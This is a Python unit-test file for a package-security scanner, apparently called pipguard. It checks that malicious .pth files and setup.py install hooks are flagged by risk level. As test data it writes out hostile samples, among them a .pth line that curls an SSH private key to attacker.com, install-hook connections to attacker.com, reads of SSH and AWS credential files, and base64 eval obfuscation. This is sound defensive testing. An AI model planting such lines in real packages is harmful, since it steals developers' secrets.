"""
Unit tests for pipguard.scanner — the core AST analysis engine.

Critical security paths tested here (from eng review test plan):
  1. .pth executable content → CRITICAL
  2. eval(base64.b64decode()) → CRITICAL
  3. Network call in install hook → CRITICAL
  4. Credential path in install hook → HIGH
  5. Credential path in runtime file → MEDIUM (not HIGH)
  6. subprocess shell=True in install hook → HIGH
  7. Sensitive env var access → MEDIUM
  8. Dynamic import → LOW
  9. Clean setup.py → no findings
 10. Clean runtime module → no findings
"""

import os
import sys
import textwrap
import tempfile
import pytest

# Ensure pipguard package is importable from repo root
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from pipguard.scanner import scan_pth_file, scan_python_file, is_install_hook_scope
from pipguard.models import RiskLevel

FIXTURES = os.path.join(os.path.dirname(__file__), "fixtures")


# ── .pth file scanning ───────────────────────────────────────────────────────

class TestScanPthFile:
    """The litellm 1.82.8 attack vector: executable code in a .pth file."""

    def test_pth_with_os_system_is_critical(self, tmp_path):
        """Classic attack: import os;os.system(...) in a .pth file."""
        pth = tmp_path / "attack.pth"
        pth.write_text(
            'import os;os.system("curl http://attacker.com/$(cat ~/.ssh/id_rsa)")\n'
        )
        findings = scan_pth_file(str(pth))
        assert findings, "Expected findings for .pth with os.system"
        assert any(f.level == RiskLevel.CRITICAL for f in findings)

    def test_litellm_attack_fixture_is_critical(self):
        """The actual litellm 1.82.8 fixture produces a CRITICAL finding."""
        pth_path = os.path.join(FIXTURES, "pth_attack", "litellm_attack.pth")
        findings = scan_pth_file(pth_path)
        assert findings, "Expected CRITICAL finding for litellm attack fixture"
        assert any(f.level == RiskLevel.CRITICAL for f in findings)

    def test_pth_with_exec_is_critical(self, tmp_path):
        pth = tmp_path / "exec.pth"
        pth.write_text('exec(open("/tmp/payload").read())\n')
        findings = scan_pth_file(str(pth))
        assert any(f.level == RiskLevel.CRITICAL for f in findings)

    def test_pth_valid_path_is_clean(self, tmp_path):
        pth = tmp_path / "clean.pth"
        pth.write_text("/usr/local/lib/python3.11/site-packages\n")
        findings = scan_pth_file(str(pth))
        assert findings == [], f"Expected no findings for valid path, got: {findings}"

    def test_pth_blank_and_comments_are_clean(self, tmp_path):
        pth = tmp_path / "comments.pth"
        pth.write_text("# comment\n\n# another comment\n")
        findings = scan_pth_file(str(pth))
        assert findings == []

    def test_pth_with_equals_sign_is_critical(self, tmp_path):
        """Assignment in .pth = Python code = CRITICAL."""
        pth = tmp_path / "assign.pth"
        pth.write_text("x = __import__('os').getcwd()\n")
        findings = scan_pth_file(str(pth))
        assert any(f.level == RiskLevel.CRITICAL for f in findings)


# ── Python file scanning: CRITICAL paths ────────────────────────────────────

class TestScanPythonFileCritical:

    def test_eval_b64decode_is_critical(self, tmp_path):
        """Classic obfuscation: eval(base64.b64decode(...))."""
        src = tmp_path / "payload.py"
        src.write_text(
            "import base64\neval(base64.b64decode('cHJpbnQoImhpIik='))\n"
        )
        findings = scan_python_file(str(src), is_hook=False)
        assert any(f.level == RiskLevel.CRITICAL for f in findings)

    def test_exec_b64decode_is_critical(self, tmp_path):
        src = tmp_path / "payload.py"
        src.write_text(
            "import base64\nexec(base64.b64decode(b'cHJpbnQoImhpIik='))\n"
        )
        findings = scan_python_file(str(src), is_hook=False)
        assert any(f.level == RiskLevel.CRITICAL for f in findings)

    def test_network_in_install_hook_is_critical(self, tmp_path):
        """Network call inside setup.py = CRITICAL (install hook scope)."""
        setup = tmp_path / "setup.py"
        setup.write_text(
            "import socket\n"
            "s = socket.create_connection(('attacker.com', 443))\n"
        )
        findings = scan_python_file(str(setup), is_hook=True)
        assert any(f.level == RiskLevel.CRITICAL for f in findings)

    def test_exec_in_install_hook_is_critical(self, tmp_path):
        setup = tmp_path / "setup.py"
        setup.write_text("exec(open('/tmp/p').read())\n")
        findings = scan_python_file(str(setup), is_hook=True)
        assert any(f.level == RiskLevel.CRITICAL for f in findings)

    def test_setup_py_fixture_is_critical(self):
        """The full malicious setup.py fixture is CRITICAL."""
        path = os.path.join(FIXTURES, "pth_attack", "setup.py")
        findings = scan_python_file(path, is_hook=True)
        assert any(f.level == RiskLevel.CRITICAL for f in findings)


# ── Python file scanning: HIGH paths ────────────────────────────────────────

class TestScanPythonFileHigh:

    def test_ssh_read_in_install_hook_is_high(self, tmp_path):
        """Reading ~/.ssh/id_rsa in setup.py = HIGH."""
        setup = tmp_path / "setup.py"
        setup.write_text(
            "open('/home/user/.ssh/id_rsa').read()\n"
        )
        findings = scan_python_file(str(setup), is_hook=True)
        assert any(f.level == RiskLevel.HIGH for f in findings)

    def test_aws_creds_in_install_hook_is_high(self, tmp_path):
        setup = tmp_path / "setup.py"
        setup.write_text("path = os.path.expanduser('~/.aws/credentials')\n")
        findings = scan_python_file(str(setup), is_hook=True)
        assert any(f.level == RiskLevel.HIGH for f in findings)

    def test_subprocess_shell_true_in_hook_is_high(self, tmp_path):
        setup = tmp_path / "setup.py"
        setup.write_text(
            "import subprocess\n"
            "subprocess.run(['ls'], shell=True)\n"
        )
        findings = scan_python_file(str(setup), is_hook=True)
        assert any(f.level == RiskLevel.HIGH for f in findings)


# ── Python file scanning: MEDIUM paths ──────────────────────────────────────

class TestScanPythonFileMedium:

    def test_ssh_read_in_runtime_is_medium_not_high(self, tmp_path):
        """Same credential access in runtime code = MEDIUM (not HIGH)."""
        mod = tmp_path / "client.py"
        mod.write_text("key = open('~/.ssh/id_rsa').read()\n")
        findings = scan_python_file(str(mod), is_hook=False)
        # Must produce MEDIUM, must NOT produce HIGH
        levels = {f.level for f in findings}
        assert RiskLevel.MEDIUM in levels
        assert RiskLevel.HIGH not in levels
        assert RiskLevel.CRITICAL not in levels

    def test_network_in_runtime_is_medium(self, tmp_path):
        mod = tmp_path / "client.py"
        mod.write_text(
            "import socket\ns = socket.create_connection(('api.example.com', 443))\n"
        )
        findings = scan_python_file(str(mod), is_hook=False)
        assert any(f.level == RiskLevel.MEDIUM for f in findings)
        assert not any(f.level == RiskLevel.CRITICAL for f in findings)

    def test_sensitive_env_var_is_medium(self, tmp_path):
        mod = tmp_path / "config.py"
        mod.write_text("import os\ntoken = os.getenv('API_TOKEN')\n")
        findings = scan_python_file(str(mod), is_hook=False)
        assert any(f.level == RiskLevel.MEDIUM for f in findings)

    def test_aws_env_var_is_medium(self, tmp_path):
        mod = tmp_path / "config.py"
        mod.write_text("import os\nkey = os.environ.get('AWS_SECRET_ACCESS_KEY')\n")
        findings = scan_python_file(str(mod), is_hook=False)
        assert any(f.level == RiskLevel.MEDIUM for f in findings)

    def test_non_sensitive_env_var_is_clean(self, tmp_path):
        mod = tmp_path / "config.py"
        mod.write_text("import os\npath = os.getenv('PATH')\n")
        findings = scan_python_file(str(mod), is_hook=False)
        assert not any(f.level == RiskLevel.MEDIUM for f in findings)


# ── Python file scanning: LOW paths ─────────────────────────────────────────

class TestScanPythonFileLow:

    def test_dynamic_import_is_low(self, tmp_path):
        mod = tmp_path / "loader.py"
        mod.write_text("import importlib\nmod = importlib.import_module('json')\n")
        findings = scan_python_file(str(mod), is_hook=False)
        assert any(f.level == RiskLevel.LOW for f in findings)

    def test_dunder_import_is_low(self, tmp_path):
        mod = tmp_path / "loader.py"
        mod.write_text("mod = __import__('json')\n")
        findings = scan_python_file(str(mod), is_hook=False)
        assert any(f.level == RiskLevel.LOW for f in findings)


# ── Clean files ──────────────────────────────────────────────────────────────

class TestScanPythonFileClean:

    def test_clean_setup_py_has_no_findings(self):
        path = os.path.join(FIXTURES, "clean_pkg", "setup.py")
        findings = scan_python_file(path, is_hook=True)
        assert findings == [], f"Unexpected findings: {findings}"

    def test_runtime_network_with_no_creds_is_medium_only(self):
        """Runtime network calls produce MEDIUM, not HIGH/CRITICAL."""
        path = os.path.join(FIXTURES, "clean_pkg", "mypkg", "__init__.py")
        findings = scan_python_file(path, is_hook=False)
        for f in findings:
            assert f.level.value <= RiskLevel.MEDIUM.value, (
                f"Expected at most MEDIUM in runtime file, got {f.level}: {f}"
            )

    def test_empty_file_is_clean(self, tmp_path):
        mod = tmp_path / "empty.py"
        mod.write_text("")
        assert scan_python_file(str(mod)) == []


# ── is_install_hook_scope ────────────────────────────────────────────────────

class TestIsInstallHookScope:
    def test_setup_py_is_hook(self):
        assert is_install_hook_scope("/pkg/setup.py")

    def test_pyproject_toml_is_hook(self):
        assert is_install_hook_scope("/pkg/pyproject.toml")

    def test_setup_cfg_is_hook(self):
        assert is_install_hook_scope("/pkg/setup.cfg")

    def test_pth_is_hook(self):
        assert is_install_hook_scope("/site-packages/foo.pth")

    def test_regular_module_is_not_hook(self):
        assert not is_install_hook_scope("/pkg/mymodule.py")

    def test_init_is_not_hook(self):
        assert not is_install_hook_scope("/pkg/__init__.py")
